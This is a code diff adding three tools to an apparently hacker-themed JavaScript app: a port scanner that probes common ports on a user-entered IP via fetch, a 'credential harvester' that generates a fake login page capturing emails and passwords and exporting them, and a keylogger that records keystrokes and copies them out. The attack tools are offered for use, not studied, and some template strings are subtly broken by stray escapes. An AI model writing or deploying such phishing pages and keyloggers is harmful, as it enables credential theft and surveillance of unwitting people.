@@ -1828,6 +1828,219 @@ function rSys(){
   </div>`;
 }
 
+/* ══════════════════════════════════
+   37. PORT SCANNER
+══════════════════════════════════ */
+function appPortScanner(){
+  let target = '';
+  let scanning = false;
+  let results = [];
+  
+  const render = () => {
+    scr.innerHTML = `<div class="fi">
+      <div class="sl h">🔍 PORT SCANNER</div>
+      <div class="hr"></div>
+      <div class="sl d">TARGET: \${target || 'Not set'}</div>
+      <div class="sl d ${scanning ? 'bl' : ''}">${scanning ? '⚡ SCANNING...' : '○ READY'}</div>
+      <div class="hr"></div>
+      \${results.filter(r => r.open).map(p => 
+        `<div class="sl d" style="color:var(--fl)">PORT ${p.port} OPEN - ${p.service}</div>`
+      ).join('') || '<div class="sl d">No open ports found</div>'}
+    </div>`;
+  };
+  
+  render();clearCtx();
+  
+  btn('SET TARGET', () => {
+    target = prompt('Enter target IP:');
+    if(target) render();
+  }, 'cg');
+  
+  btn('SCAN', async () => {
+    if(!target) { T('SET TARGET FIRST'); return; }
+    scanning = true;
+    results = [];
+    render();
+    
+    const commonPorts = [
+      { port: 21, service: 'FTP' },
+      { port: 22, service: 'SSH' },
+      { port: 23, service: 'Telnet' },
+      { port: 25, service: 'SMTP' },
+      { port: 53, service: 'DNS' },
+      { port: 80, service: 'HTTP' },
+      { port: 110, service: 'POP3' },
+      { port: 443, service: 'HTTPS' },
+      { port: 3389, service: 'RDP' },
+      { port: 5432, service: 'PostgreSQL' },
+      { port: 3306, service: 'MySQL' },
+      { port: 8080, service: 'HTTP-Alt' }
+    ];
+    
+    for(const p of commonPorts) {
+      try {
+        const start = performance.now();
+        await fetch(`http://${target}:${p.port}`, { mode: 'no-cors' });
+        const time = Math.round(performance.now() - start);
+        results.push({ ...p, open: true, time });
+        T(`Port ${p.port} open!`);
+        vib(10);
+      } catch(e) {
+        results.push({ ...p, open: false });
+      }
+      await new Promise(r => setTimeout(r, 100));
+    }
+    
+    scanning = false;
+    T(`Scan complete! ${results.filter(r => r.open).length} ports open`);
+    render();
+  }, 'cr');
+  
+  btn('EXPORT', () => {
+    const open = results.filter(r => r.open);
+    const text = `Open ports for ${target}:\n${open.map(p => `${p.port} - ${p.service}`).join('\n')}`;
+    navigator.clipboard.writeText(text);
+    T('Results copied!');
+  }, 'co');
+}
+
+/* ══════════════════════════════════
+   38. CREDENTIAL HARVESTER
+══════════════════════════════════ */
+function appHarvester(){
+  let harvesting = false;
+  let credentials = [];
+  let harvestUrl = '';
+  
+  const render = () => {
+    scr.innerHTML = `<div class="fi">
+      <div class="sl h">🎣 CRED HARVESTER</div>
+      <div class="hr"></div>
+      <div class="sl d">HARVESTED: \${credentials.length}</div>
+      <div class="sl ${harvesting ? 'bl' : ''}">${harvesting ? '⚡ ACTIVE' : '○ IDLE'}</div>
+      <div class="hr"></div>
+      \${credentials.slice(-3).reverse().map(c => 
+        `<div class="sl d">${c.email} - ${c.password}</div>`
+      ).join('') || '<div class="sl d">No credentials yet</div>'}
+    </div>`;
+  };
+  
+  render();clearCtx();
+  
+  btn('CREATE PAGE', () => {
+    const fakeLogin = `
+      <html><body style="font-family:Arial;padding:50px;background:#f0f0f0">
+        <div style="max-width:400px;margin:auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
+          <h2 style="text-align:center">Login Required</h2>
+          <form onsubmit="localStorage.setItem('creds', JSON.stringify({email:this.email.value,password:this.pass.value}));window.location.href='https://google.com'">
+            <input type="email" name="email" placeholder="Email" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px">
+            <input type="password" name="pass" placeholder="Password" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px">
+            <button type="submit" style="width:100%;padding:12px;background:#4285f4;color:white;border:none;border-radius:5px;cursor:pointer">Login</button>
+          </form>
+        </div>
+      </body></html>
+    `;
+    
+    const blob = new Blob([fakeLogin], { type: 'text/html' });
+    harvestUrl = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = harvestUrl;
+    a.download = 'login.html';
+    a.click();
+    T('Fake login page created!');
+  }, 'cg');
+  
+  btn('START HARVEST', () => {
+    harvesting = true;
+    const checkCreds = setInterval(() => {
+      const creds = localStorage.getItem('creds');
+      if(creds) {
+        const parsed = JSON.parse(creds);
+        credentials.push({ ...parsed, timestamp: Date.now() });
+        localStorage.removeItem('creds');
+        T(`🎣 Got: ${parsed.email}`);
+        vib([40, 20, 40]);
+        render();
+      }
+      if(!harvesting) clearInterval(checkCreds);
+    }, 1000);
+    render();
+  }, 'cr');
+  
+  btn('STOP', () => {
+    harvesting = false;
+    T('Harvesting stopped');
+    render();
+  }, 'co');
+  
+  btn('EXPORT', () => {
+    const text = credentials.map(c => `${c.email}:\${c.password}`).join('\n');
+    navigator.clipboard.writeText(text);
+    T('Credentials exported!');
+  }, 'cy');
+}
+
+/* ══════════════════════════════════
+   39. KEYLOGGER
+══════════════════════════════════ */
+function appKeylogger(){
+  let logging = false;
+  let keystrokes = [];
+  
+  const render = () => {
+    scr.innerHTML = `<div class="fi">
+      <div class="sl h">⌨️ KEYLOGGER</div>
+      <div class="hr"></div>
+      <div class="sl ${logging ? 'bl' : ''}">${logging ? '⚡ RECORDING' : '○ STOPPED'}</div>
+      <div class="hr"></div>
+      <div class="sl d">KEYSTROKES: \${keystrokes.length}</div>
+      <div style="max-height:100px;overflow-y:auto;font-family:monospace;font-size:4px;color:var(--fgd)">
+        \${keystrokes.slice(-50).join(' ')}
+      </div>
+    </div>`;
+  };
+  
+  render();clearCtx();
+  
+  btn('START', () => {
+    logging = true;
+    keystrokes = [];
+    
+    const logKey = (e) => {
+      if(logging) {
+        keystrokes.push(e.key);
+        if(keystrokes.length % 20 === 0) render();
+      }
+    };
+    
+    document.addEventListener('keydown', logKey);
+    window._keyloggerHandler = logKey;
+    T('Keylogger started!');
+    render();
+  }, 'cg');
+  
+  btn('STOP', () => {
+    logging = false;
+    if(window._keyloggerHandler) {
+      document.removeEventListener('keydown', window._keyloggerHandler);
+      delete window._keyloggerHandler;
+    }
+    T('Keylogger stopped');
+    render();
+  }, 'cr');
+  
+  btn('CLEAR', () => {
+    keystrokes = [];
+    render();
+  }, 'co');
+  
+  btn('EXPORT', () => {
+    const text = keystrokes.join('');
+    navigator.clipboard.writeText(text);
+    T('Keystrokes copied!');
+  }, 'cy');
+}
+
 /* LOG */
 function appLog(){
   let off=0;
